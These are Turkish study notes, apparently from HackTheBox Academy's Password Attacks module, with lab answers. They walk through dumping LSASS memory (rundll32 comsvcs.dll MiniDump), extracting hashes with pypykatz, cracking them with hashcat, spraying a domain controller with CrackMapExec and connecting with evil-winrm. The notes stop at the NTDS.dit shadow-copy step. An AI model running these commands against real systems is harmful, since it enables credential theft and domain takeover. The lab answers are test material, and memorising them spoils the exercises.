Soru : Hedefteki LSA gizli bilgilerini boşaltın ve depolanan kimlik bilgilerini keşfedin. Kullanıcı adı ve şifreyi cevap olarak gönderin. (Biçim: kullanıcı adı:parola, Harfe Duyarlı)

Cevap : frontdesk:Passowrd123
![Pasted image 20241102182423.png](/img/user/resimler/Pasted%20image%2020241102182423.png)




# Attacking LSASS
Hash'leri dump etmek ve kırmak için SAM veritabanının kopyalarını almanın yanı sıra, LSASS'ı hedeflemekten de faydalanacağız. Bu modülün Credential Storage bölümünde tartışıldığı gibi LSASS, kimlik bilgisi yönetiminde ve tüm Windows işletim sistemlerindeki kimlik doğrulama işlemlerinde merkezi bir rol oynayan kritik bir hizmettir.

![Pasted image 20241102222143.png](/img/user/resimler/Pasted%20image%2020241102222143.png)

İlk oturum açıldığında, LSASS şunları yapacaktır:  

- Kimlik bilgilerini lokal olarak bellekte önbelleğe alma  
- [Erişim belirteçleri](“https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens”) (access tokens) oluşturma  
- Güvenlik politikalarını uygulayın  
- Windows [güvenlik günlüğüne](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security) yaz


LSASS belleğini boşaltmak ve Windows çalıştıran bir hedeften kimlik bilgilerini çıkarmak için kullanabileceğimiz bazı teknik ve araçları ele alalım.


## **LSASS Process Belleğini Dump Etme**  

SAM veritabanına LSASS ile saldırma sürecine benzer şekilde, öncelikle bir bellek dökümü oluşturarak LSASS proses belleğinin içeriğinin bir kopyasını oluşturmamız akıllıca olacaktır. Bir döküm dosyası oluşturmak, saldırı hostumuzu kullanarak kimlik bilgilerini çevrimdışı olarak çıkarmamızı sağlar. Çevrimdışı saldırılar gerçekleştirmenin bize saldırı hızımızda daha fazla esneklik sağladığını ve hedef sistemde daha az zaman harcamamızı gerektirdiğini unutmayın. Bellek dökümü oluşturmak için kullanabileceğimiz sayısız yöntem vardır. Windows'ta zaten local olarak bulunan araçlar kullanılarak gerçekleştirilebilecek teknikleri ele alalım.


#### **Görev Yöneticisi Yöntemi**  

Hedefle etkileşimli bir grafik oturumuna erişerek, bir bellek dökümü oluşturmak için görev yöneticisini kullanabiliriz. Bunun için şunları yapmamız gerekir:

![Pasted image 20241102223237.png](/img/user/resimler/Pasted%20image%2020241102223237.png)

`Open Task Manager` > `Select the Processes tab` > `Find & right click the Local Security Authority Process` > `Select Create dump file`

`lsass.DMP` adında bir dosya oluşturulur ve içine kaydedilir:

```cmd-session
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```

Bu, saldırı host'umuza aktaracağımız dosyadır. Dump dosyasını saldırı hostumuza aktarmak için bu modülün `Attacking SAM` bölümünde anlatılan dosya aktarım yöntemini kullanabiliriz.


#### **Rundll32.exe & Comsvcs.dll Yöntemi**  

Görev Yöneticisi yöntemi, hedefle GUI tabanlı etkileşimli bir oturuma sahip olmamıza bağlıdır. LSASS proses belleğini [[Bağlantılar/rundll32.exe\|rundll32.exe]] adlı bir komut satırı yardımcı programı aracılığıyla dump etmek için alternatif bir yöntem kullanabiliriz. Bu yöntem Görev Yöneticisi yönteminden daha hızlı ve daha esnektir çünkü bir Windows hostunda yalnızca komut satırına erişimi olan bir shell oturumu elde edebiliriz. Modern anti-virüs araçlarının bu yöntemi kötü amaçlı etkinlik olarak tanıdığını unutmamak önemlidir.  

Dump dosyasını oluşturmak için komutu vermeden önce, `lsass.exe`'ye hangi işlem kimliğinin (`PID`) atandığını belirlemeliyiz. Bu cmd veya PowerShell'den yapılabilir:


#### **cmd'de LSASS PID'sini bulma**  

Cmd'den `tasklist /svc` komutunu verebilir ve PID alanında lsass.exe ve process ID'sini bulabiliriz.

```cmd-session
C:\Windows\system32> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                        96 N/A
smss.exe                       344 N/A
csrss.exe                      432 N/A
wininit.exe                    508 N/A
csrss.exe                      520 N/A
winlogon.exe                   580 N/A
services.exe                   652 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 PlugPlay
svchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,
                                   SystemEventsBroker
fontdrvhost.exe                812 N/A
```

#### **PowerShell'de LSASS PID Bulma**  

PowerShell'den `Get-Process lsass` komutunu verebilir ve `Id` alanında `proses` kimliğini görebiliriz.

```powershell-session
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```

LSASS sürecine PID atandıktan sonra, dump dosyasını oluşturabiliriz.

#### **PowerShell kullanarak lsass.dmp oluşturma**  

Yükseltilmiş bir PowerShell oturumuyla, dump dosyasını oluşturmak için aşağıdaki komutu verebiliriz:

```powershell-session
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

Bu komutla, `rundll32.exe` dosyasını çalıştırarak `comsvcs.dll` dosyasının export edilmiş bir fonksiyonunu çağırıyoruz ve bu fonksiyon da MiniDumpWriteDump (`MiniDump`) fonksiyonunu çağırarak LSASS proses belleğini belirtilen bir dizine (`C:\lsass.dmp`) dump ediyor. Çoğu modern AV aracının bunu kötü amaçlı olarak algıladığını ve komutun yürütülmesini engellediğini hatırlayın. Bu durumlarda, karşı karşıya olduğumuz AV aracını atlatmanın veya devre dışı bırakmanın yollarını düşünmemiz gerekecektir. AV bypass teknikleri bu modülün kapsamı dışındadır.  

Bu komutu çalıştırmayı ve `lsass.dmp` dosyasını oluşturmayı başarırsak, LSASS proses belleğinde saklanmış olabilecek kimlik bilgilerini çıkarmayı denemek için dosyayı saldırı kutumuza aktarmaya devam edebiliriz.

## **Kimlik Bilgilerini Çıkarmak için Pypykatz Kullanma**

Saldırı hostumuzda dump dosyasını elde ettikten sonra, .dmp dosyasından kimlik bilgilerini çıkarmaya çalışmak için [pypykatz](“https://github.com/skelsec/pypykatz”) adlı güçlü bir araç kullanabiliriz. Pypykatz, Mimikatz'ın tamamen Python ile yazılmış bir uygulamasıdır. Python'da yazılmış olması, Linux tabanlı saldırı hostlarında çalıştırmamıza olanak tanır. Bu yazının yazıldığı sırada, Mimikatz yalnızca Windows sistemlerinde çalışıyordu, bu nedenle onu kullanmak için ya bir Windows saldırı hostu kullanmamız ya da Mimikatz'ı doğrudan hedef üzerinde çalıştırmamız gerekecekti ki bu ideal bir senaryo değildir. Bu durum Pypykatz'ı cazip bir alternatif haline getirmektedir çünkü ihtiyacımız olan tek şey dump dosyasının bir kopyasıdır ve bunu Linux tabanlı saldırı hostumuzdan çevrimdışı olarak çalıştırabiliriz.  

LSASS'ın Windows sistemlerinde aktif oturum açma oturumlarına sahip kimlik bilgilerini sakladığını hatırlayın. LSASS proses belleğini dosyaya döktüğümüzde, esasen o anda bellekte ne olduğunun bir " snapshot "ını almış olduk. Herhangi bir aktif oturum açma oturumu varsa, bunları oluşturmak için kullanılan kimlik bilgileri mevcut olacaktır. Pypykatz'ı döküm dosyasına karşı çalıştıralım ve öğrenelim.

#### **Pypykatz Çalıştırılıyor**  

Komut, LSASS proses bellek dump'ında gizlenen sırları ayrıştırmak için `pypykatz` kullanımını başlatır. LSASS bir `local security authority` alt sistemi olduğu için komutta `lsa` kullanıyoruz, ardından veri kaynağını bir `minidump` dosyası olarak belirtiyoruz ve saldırı hostumuzda depolanan dump dosyasının (`/home/peter/Documents/lsass.dmp`) yolu ile devam ediyoruz. Pypykatz dump dosyasını ayrıştırır ve bulguları çıktı olarak verir:

```shell-session
M1R4CKCK@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 

INFO:root:Parsing file /home/peter/Documents/lsass.dmp
FILE: ======== /home/peter/Documents/lsass.dmp =======
== LogonSession ==
authentication_id 1354633 (14ab89)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605

== LogonSession ==
authentication_id 1354581 (14ab55)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354581
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)

== LogonSession ==
authentication_id 1343859 (148173)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2021-12-14T18:14:25.248681+00:00
sid S-1-5-90-0-2
luid 1343859
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
```

Çıktıdaki bazı yararlı bilgilere daha ayrıntılı bir şekilde göz atalım.

#### MSV

```shell-session
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```

[MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package), Windows'ta LSA'nın SAM veritabanına karşı oturum açma girişimlerini doğrulamak için çağırdığı bir kimlik doğrulama paketidir. Pypykatz, LSASS proses belleğinde saklanan bob kullanıcı hesabının oturum açma oturumuyla ilişkili `SID`, `Username`, `Domain` ve hatta `NT` ve `SHA1` şifre karmalarını çıkardı. Bu, bu bölümün sonunda ele alınan saldırımızın son aşamasında yardımcı olacaktır.

#### WDIGEST

```shell-session
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
```

`WDIGEST`, `Windows XP` - `Windows 8` ve `Windows Server 2003` - `Windows Server 2012`'de varsayılan olarak etkinleştirilmiş eski bir kimlik doğrulama protokolüdür. LSASS, WDIGEST tarafından kullanılan kimlik bilgilerini açık metin olarak önbelleğe alır. Bu, kendimizi WDIGEST'in etkin olduğu bir Windows sistemini hedeflerken bulursak, büyük olasılıkla açık metin olarak bir parola göreceğimiz anlamına gelir. Modern Windows işletim sistemlerinde WDIGEST varsayılan olarak devre dışıdır. Ek olarak, Microsoft'un WDIGEST ile ilgili bu sorundan etkilenen sistemler için bir güvenlik güncellemesi yayınladığını da belirtmek gerekir. Bu güvenlik güncellemesinin ayrıntılarını [buradan](https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/) inceleyebiliriz.

#### Kerberos

```shell-session
== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
```

[Kerberos](“https://web.mit.edu/kerberos/#what_is”), Windows Domain ortamlarında Active Directory tarafından kullanılan bir ağ kimlik doğrulama protokolüdür. Domain kullanıcı hesaplarına Active Directory ile kimlik doğrulaması yapıldıktan sonra bilet verilir. Bu bilet, kullanıcının her seferinde kimlik bilgilerini yazmasına gerek kalmadan erişim izni verilen ağdaki paylaşılan kaynaklara erişmesine izin vermek için kullanılır. LSASS, Kerberos ile ilişkili `parolaları`, `ekeyleri`, `biletleri` ve `pinleri` `önbelleğe` alır. Bunları LSASS proses belleğinden çıkarmak ve aynı domain'e bağlı diğer sistemlere erişmek için kullanmak mümkündür.

#### DPAPI
```shell-session
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```

Data Protection Application Programming Interface veya [DPAPI](“https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection”), Windows işletim sistemlerinde, Windows OS özellikleri ve çeşitli üçüncü taraf uygulamaları için kullanıcı bazında DPAPI veri bloblarını şifrelemek ve şifresini çözmek için kullanılan bir dizi API'dir. Aşağıda DPAPI kullanan uygulamalardan ve bu uygulamaları ne için kullandıklarından sadece birkaç örnek verilmiştir:

![Pasted image 20241102225640.png](/img/user/resimler/Pasted%20image%2020241102225640.png)

Mimikatz ve Pypykatz, verileri LSASS proses belleğinde bulunan oturum açmış kullanıcı için DPAPI `masterkey` 'i çıkarabilir. Bu masterkey daha sonra DPAPI kullanan uygulamaların her biriyle ilişkili sırların şifresini çözmek için kullanılabilir ve çeşitli hesapların kimlik bilgilerinin ele geçirilmesiyle sonuçlanabilir. DPAPI saldırı teknikleri [Windows Privilege Escalation](https://academy.hackthebox.com/module/details/67) modülünde daha ayrıntılı olarak ele alınmaktadır.

#### **Hashcat ile NT Hash'ini Kırma**  

Şimdi NT Hash'ini kırmak için Hashcat'i kullanabiliriz. Bu örnekte, Bob kullanıcısıyla ilişkili yalnızca bir NT hash'i bulduk, bu da bu modülün `SAM'e Saldırma` bölümünde yaptığımız gibi bir hash listesi oluşturmamız gerekmeyeceği anlamına geliyor. Komutta modu ayarladıktan sonra, hash'i yapıştırabilir, bir kelime listesi belirleyebilir ve ardından hash'i kırabiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```

Kırma girişimimiz tamamlandı ve genel saldırımız başarılı sayılabilir.


Soru : Local Security Authority Process ile ilişkili yürütülebilir dosyanın adı nedir?
Cevap : lsass.exe


Soru : Hedefteki Vendor kullanıcı hesabının parolasını elde etmek için bu bölümde öğretilen kavramları uygulayın. Cevap olarak açık metin şifresini gönderin. (Biçim: Büyük/küçük harfe duyarlı)
Cevap :

1- rdp ile hedefe bağlan 

2- lsass dump al 

3- file transfer ile attack host'a yolla 

4- hedef sistemde hashcat ile kır . 


# Attacking Active Directory & NTDS.dit

Bu bölümde, öncelikle `AD account'larına karşı` bir `dictionary saldırısı` kullanarak ve `NTDS.dit` dosyasından `hash'leri dökerek` kimlik bilgilerini nasıl çıkarabileceğimize odaklanacağız.

Şimdiye kadar ele aldığımız birçok saldırıda olduğu gibi, hedefimizin ağ üzerinden erişilebilir olması gerekir. Bu da büyük olasılıkla hedefin bağlı olduğu iç ağda bir dayanak noktası oluşturmamız gerekeceği anlamına gelir. Bununla birlikte, bir kuruluşun remote masaüstü protokolünü (`3389`) veya [edge router](“https://www.cisco.com/c/en/us/products/routers/what-is-an-edge-router.html”) 'larında remote erişim için kullanılan diğer protokolleri iç ağlarındaki bir sisteme iletmek için port [yönlendirme](“https://www.cisco.com/c/en/us/products/routers/what-is-an-edge-router.html”) kullanabileceği durumlar da vardır. Lütfen bu modülde ele alınan yöntemlerin çoğunun ilk ele geçirmeden sonraki adımları simüle ettiğini ve iç ağda bir dayanak noktası oluşturulduğunu unutmayın. Saldırı yöntemlerini uygulamadan önce, bir Windows sistemi domain'e katıldıktan sonra kimlik doğrulama sürecini ele alalım. Bu yaklaşım, Active Directory'nin önemini ve maruz kalabileceği parola saldırılarını daha iyi anlamamıza yardımcı olacaktır.

![Pasted image 20241103150133.png](/img/user/resimler/Pasted%20image%2020241103150133.png)
Bir Windows sistemi bir domain'e katıldığında, `artık oturum açma isteklerini doğrulamak için SAM veritabanına başvurmayacaktır`. Domain'e katılmış olan bu sistem artık bir kullanıcının oturum açmasına izin vermeden önce tüm kimlik doğrulama isteklerini domain controller tarafından doğrulanmak üzere gönderecektir. Bu, SAM veritabanının artık kullanılamayacağı anlamına gelmez. SAM veritabanında lokal bir hesap kullanarak oturum açmak isteyen biri, `Kullanıcı Adı` ile devam eden cihazın `host adını` belirterek (Örnek: `WS01/nameofuser`) veya cihaza doğrudan erişim sağlayarak oturum açma `kullanıcı` arayüzünde `Kullanıcı Adı` alanına `./` yazarak bunu yapmaya devam edebilir. Bu dikkate değerdir çünkü gerçekleştirdiğimiz saldırılardan hangi sistem bileşenlerinin etkilendiğine dikkat etmemiz gerekir. Ayrıca, Windows masaüstü işletim sistemlerini veya Windows sunucu işletim sistemlerini doğrudan fiziksel erişimle veya bir ağ üzerinden hedeflerken göz önünde bulundurmamız gereken ek saldırı yolları sağlayabilir. Bu [tekniği](https://attack.mitre.org/techniques/T1003/003/) takip ederek NTDS saldırılarını da inceleyebileceğimizi unutmayın.


## **CrackMapExec kullanarak AD hesaplarına karşı sözlük saldırıları**

Sözlük saldırısının, potansiyel kullanıcı adı ve parolaların özelleştirilmiş bir listesini kullanarak bir kullanıcı adı ve / veya parolayı tahmin etmek için bir bilgisayarın gücünü kullanmak olduğunu unutmayın. Bu saldırıları bir ağ üzerinden gerçekleştirmek oldukça `gürültülü` (tespit edilmesi kolay) olabilir, çünkü hedef sistemde çok fazla ağ trafiği ve uyarı oluşturabilir ve sonunda [Grup İlkesi](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831791(v=ws.11)) kullanılarak uygulanabilecek oturum açma girişimi kısıtlamaları nedeniyle reddedilebilirler.

Kendimizi sözlük saldırısının uygulanabilir bir sonraki adım olduğu bir senaryoda bulduğumuzda, saldırımızı mümkün olduğunca `özel olarak uyarlamaya` çalışmaktan fayda sağlayabiliriz. Bu durumda, saldırıyı gerçekleştirmek için birlikte çalıştığımız kuruluşu göz önünde bulundurabilir ve çeşitli sosyal medya web sitelerinde arama yapabilir ve şirketin web sitesinde bir çalışan dizini arayabiliriz. Bunu yapmak, kuruluşta çalışanların isimlerini elde etmemize neden olabilir. Yeni bir çalışanın alacağı ilk şeylerden biri bir kullanıcı adıdır. Birçok kuruluş, çalışan kullanıcı adlarını oluştururken bir adlandırma kuralı izler. İşte dikkate alınması gereken bazı yaygın kurallar:

![Pasted image 20241103175618.png](/img/user/resimler/Pasted%20image%2020241103175618.png)

Genellikle, bir e-posta adresinin yapısı bize çalışanın kullanıcı adını verecektir (yapı: username@domain). Örneğin, `jdoe`@inlanefreight`.com` e-posta adresinden kullanıcı adının `jdoe` olduğunu görürüz.  

MrB3n'den bir ipucu: E-posta yapısını genellikle domain adını Google'da “@inlanefreight.com” şeklinde aratarak bulabilir ve bazı geçerli e-postalar elde edebiliriz. Buradan, çeşitli sosyal medya sitelerini kazımak ve potansiyel geçerli kullanıcı adlarını karıştırmak için bir komut dosyası kullanabiliriz. Bazı kuruluşlar püskürtmeyi önlemek için kullanıcı adlarını gizlemeye çalışır, bu nedenle kullanıcı adlarını a907 (veya benzer bir şey) gibi joe.smith olarak değiştirebilirler. Bu şekilde, e-posta mesajları iletilebilir, ancak gerçek dahili kullanıcı adı ifşa edilmez ve parola püskürtmeyi zorlaştırır. Bazen google dorks kullanarak “inlanefreight.com filetype:pdf” araması yapabilir ve bir grafik editörü kullanılarak oluşturulmuşlarsa PDF özelliklerinde bazı geçerli kullanıcı adları bulabilirsiniz. Buradan, kullanıcı adı yapısını ayırt edebilir ve potansiyel olarak birçok olası kombinasyon oluşturmak için küçük bir komut dosyası yazabilir ve ardından herhangi birinin geçerli olup olmadığını görmek için püskürtebilirsiniz.

#### **Özel Kullanıcı Adı Listesi Oluşturma**  

Diyelim ki araştırmamızı yaptık ve kamuya açık bilgilere dayanarak bir isim listesi topladık. Bu dersin amacı doğrultusunda listeyi nispeten kısa tutacağız çünkü kuruluşların çok sayıda çalışanı olabilir. Örnek isim listesi:

- Ben Williamson
- Bob Burgerstien
- Jim Stevenson
- Jill Johnson
- Jane Doe

Yukarıdaki isimleri kullanarak saldırı hostumuzda özel bir liste oluşturabiliriz

```shell-session
M1R4CKCK@htb[/htb]$ cat usernames.txt 
bwilliamson
benwilliamson
ben.willamson
willamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.jim
```

Elbette, bu sadece bir örnektir ve tüm isimleri içermez, ancak hedef kuruluş tarafından kullanılan adlandırma kuralını zaten bilmiyorsak, her ad için nasıl farklı bir adlandırma kuralı ekleyebileceğimize dikkat edin.  

Listelerimizi manuel olarak oluşturabilir ya da Ruby tabanlı [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) aracı gibi `otomatik` bir `liste oluşturucu` kullanarak gerçek isimlerden oluşan bir listeyi yaygın kullanıcı adı formatlarına dönüştürebiliriz. Araç `Git` kullanılarak lokal saldırı hostumuza klonlandıktan sonra, aşağıdaki örnek çıktıda gösterildiği gibi bir gerçek isim listesine karşı çalıştırabiliriz:


```shell-session
M1R4CKCK@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 

ben
benwilliamson
ben.williamson
benwilli
benwill
benw
b.williamson
bwilliamson
wben
w.ben
williamsonb
williamson
williamson.b
williamson.ben
bw
bob
bobburgerstien
bob.burgerstien
bobburge
bobburg
bobb
b.burgerstien
bburgerstien
bbob
b.bob
burgerstienb
burgerstien
burgerstien.b
burgerstien.bob
bb
jim
jimstevenson
jim.stevenson
jimsteve
jimstev
jims
j.stevenson
jstevenson
sjim
s.jim
stevensonj
stevenson
stevenson.j
stevenson.jim
js
jill
jilljohnson
jill.johnson
jilljohn
jillj
j.johnson
jjohnson
jjill
j.jill
johnsonj
johnson
johnson.j
johnson.jill
jj
jane
janedoe
jane.doe
janed
j.doe
jdoe
djane
d.jane
doej
doe
doe.j
doe.jane
jd
```

Otomatik araçlar kullanmak listeleri hazırlarken bize zaman kazandırabilir. Yine de, bir kuruluşun kullanıcı adlarıyla kullandığı adlandırma kuralını keşfetmeye çalışırken olabildiğince fazla zaman harcamaktan fayda sağlayacağız çünkü bu, adlandırma kuralını tahmin etme ihtiyacımızı azaltacaktır.

Parola saldırıları gerçekleştirirken tahmin etme ihtiyacını mümkün olduğunca sınırlamak idealdir.

#### **CrackMapExec ile Saldırıyı Başlatmak**

Listelerimizi hazırladıktan veya adlandırma kurallarını ve bazı çalışan adlarını keşfettikten sonra, CrackMapExec gibi bir araç kullanarak hedef domain controller'a karşı saldırımızı başlatabiliriz. Hedef Domain Controller'a oturum açma istekleri göndermek için SMB protokolü ile birlikte kullanabiliriz. İşte bunu yapmak için gerekli komut:

```shell-session
M1R4CKCK@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

SMB         10.129.201.57     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2016 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2015 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2014 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2013 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@55w0rd STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [+] inlanefrieght.local\bwilliamson:P@55w0rd! 
```

Bu örnekte CrackMapExec, SMB'yi kullanarak yaygın olarak kullanılan parolaların bir listesini (`/usr/share/wordlists/fasttrack.txt`) içeren bir parola (`-p`) listesi kullanarak kullanıcı (`-u`) `bwilliamson` olarak oturum açmaya çalışmaktadır. Eğer yöneticiler bir hesap kilitleme politikası yapılandırmışlarsa, bu saldırı hedeflediğimiz hesabı kilitleyebilir. Bu yazının yazıldığı tarihte (Ocak 2022), bir Windows domain'i için geçerli olan varsayılan grup ilkelerinde varsayılan olarak bir hesap kilitleme ilkesi uygulanmamaktadır, yani tam olarak uyguladığımız bu saldırıya karşı savunmasız ortamlarla karşılaşmamız mümkündür.


#### Event Logs from the Attack

![Pasted image 20241103180135.png](/img/user/resimler/Pasted%20image%2020241103180135.png)

Bir saldırıdan geriye ne kalmış olabileceğini bilmek faydalı olabilir. Bunu bilmek, iyileştirme önerilerimizi birlikte çalıştığımız müşteri için daha etkili ve değerli hale getirebilir. Herhangi bir Windows işletim sisteminde, bir yönetici `Event Viewer` 'a gidebilir ve günlüğe kaydedilen eylemleri tam olarak görmek için Güvenlik olaylarını görüntüleyebilir. Bu, daha sıkı güvenlik kontrolleri uygulama kararlarını bilgilendirebilir ve bir ihlalin ardından söz konusu olabilecek olası soruşturmalara yardımcı olabilir.  

Bazı kimlik bilgilerini keşfettikten sonra, hedef domain controller'a uzaktan erişim sağlamaya ve NTDS.dit dosyasını ele geçirmeye devam edebiliriz.

## **NTDS.dit'in Ele Geçirilmesi**  

`NT Directory Services` (`NTDS`), ağ kaynaklarını bulmak ve düzenlemek için AD ile birlikte kullanılan dizin hizmetidir. `NTDS.dit` dosyasının bir [ormandaki](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model) domain controller'larda `%systemroot%/ntds` adresinde depolandığını hatırlayın. `.dit` [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html) anlamına gelir. Bu, AD ile ilişkili birincil veritabanı dosyasıdır ve tüm domain kullanıcı adlarını, parola karmalarını ve diğer kritik şema bilgilerini depolar. Bu dosya ele geçirilebilirse, bu modülün `SAM'e Saldırma` bölümünde ele aldığımız tekniğe benzer şekilde domain üzerindeki tüm hesapların güvenliğini tehlikeye `atabiliriz`. Bu tekniği uygularken, AD'yi korumanın önemini düşünün ve bu saldırının gerçekleşmesini engellemek için birkaç yol üzerinde beyin fırtınası yapın.


#### **Evil-WinRM ile bir DC'ye bağlanma**  

Yakaladığımız kimlik bilgilerini kullanarak bir hedef DC'ye bağlanabiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```
Evil-WinRM, hedefle bir PowerShell oturumu kurmak için PowerShell Remoting Protokolü ile birlikte Windows Remote Management hizmetini kullanarak bir hedefe bağlanır.


#### **Lokal Grup Üyeliğini Kontrol Etme**  

Bağlandıktan sonra, `bwilliamson` 'un hangi ayrıcalıklara sahip olduğunu kontrol edebiliriz. Komutu kullanarak lokal grup üyeliğine bakmakla başlayabiliriz:

```shell-session
*Evil-WinRM* PS C:\> net localgroup

Aliases for \\DC01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.
```

Hesabın lokal yönetici haklarına sahip olup olmadığına bakıyoruz. NTDS.dit dosyasının bir kopyasını oluşturmak için yerel admin (`Administrators grubu`) veya Domain Admin (Domain`Admins grubu`) (veya eşdeğeri) haklarına ihtiyacımız var. Ayrıca hangi domain ayrıcalıklarına sahip olduğumuzu da kontrol etmek isteyeceğiz.

#### **Domain dahil Kullanıcı Hesabı Ayrıcalıklarını Kontrol Etme**

```shell-session
*Evil-WinRM* PS C:\> net user bwilliamson

User name                    bwilliamson
Full Name                    Ben Williamson
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/13/2022 12:48:58 PM
Password expires             Never
Password changeable          1/14/2022 12:48:58 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/14/2022 2:07:49 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.
```

Bu hesap hem Administrators hem de Domain Administrator haklarına sahiptir, bu da NTDS.dit dosyasının bir kopyasını oluşturmak da dahil olmak üzere istediğimiz her şeyi yapabileceğimiz anlamına gelir.


#### **C'nin Shadow Kopyasını Oluşturma**  

